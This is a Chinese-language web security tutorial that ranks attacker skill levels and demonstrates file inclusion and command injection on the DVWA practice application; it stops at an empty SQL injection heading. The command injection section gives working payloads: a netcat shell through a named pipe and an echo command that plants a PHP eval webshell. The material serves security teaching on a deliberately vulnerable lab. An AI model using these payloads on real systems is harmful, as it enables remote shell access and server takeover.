WEB安全三境界

  • Tools User 工具小子
    对各种漏洞原理浅浅了解，缺乏Web站点开发与运维经验能力，缺乏对HTTP协议的掌握，只能略读懂（甚至不懂）一种或多种脚本语言。通常只会使用别人开发的攻击测试工具（以Windows GUI为主），以猜测弱口令、自主利用“BB型”漏洞或者使用他人漏洞利用脚本工具为自豪感来源。

  • Scripts Maker 脚本小子
    对各种漏洞原理基本掌握，具备一定的Web站点开发与运维经验能力，基本掌握HTTP协议，能够简单审计至少一种脚本语言。能够按照实际需求开发WEB攻击测试脚本，了解浏览器安全

  • Web Hacker 安全研究员/WEB黑客
    深谙各种漏洞原理，具备丰富的Web站点开发与运维经验能力，熟悉HTTP协议，具备独立审计WEB应用并发现0day漏洞的能力，研究浏览器安全。能够按照需求开发WEB攻击测试框架。

  • Master 大师
    研究WEB安全前沿领域，培养WEB安全人才。

WEB应用服务体系与攻击测试步骤

WEB安全漏洞演示 Baby Demo

我们将展示基于PHP+MySQL（目前广泛用于中小型站点）的WEB应用漏洞利用过程。展示在Damn Vulnerable Web Application(DVWA) Version 1.9上进行。虽然DVWA于2015-09-19发布1.9版本后再更新，但仍然是比较好WEB安全入门测试平台。

一、信息泄露类

（一）文件包含漏洞

PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。

  • 漏洞发现
    1. 引用本站或站外某个功能点
    2. 找到传递的参数(get/post)，查看是否有包含的关系
  • 示例漏洞代码

include()：The include statement includes and evaluates the specified file.包含文件，并正确执行，若是找不到包含的文件，路径有问题时，会警告，但不会停止运行。

  • Payload:
    file=file_path_youwant

二、注入类

（一）命令与代码注入漏洞 Command/Code Injection

  • 漏洞发现

    1. 是否能调用系统命令或者php函数
    2. 查找传递的参数(get/post)

  • 示例漏洞代码

shell_exec() — Execute command via shell and return the complete output as a string

  • 利用姿势:

  1. 反弹shell

    1;mkfifo /tmp/e;sh /tmp/e | nc -nlp 2333 > /tmp/e

  2. 写入webshell
    1;echo '<?php eval($_POST["c"]);?>' > ws.php

  3. 利用commix自动测试

（二） SQL注入漏洞

SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

  • 利用姿势：
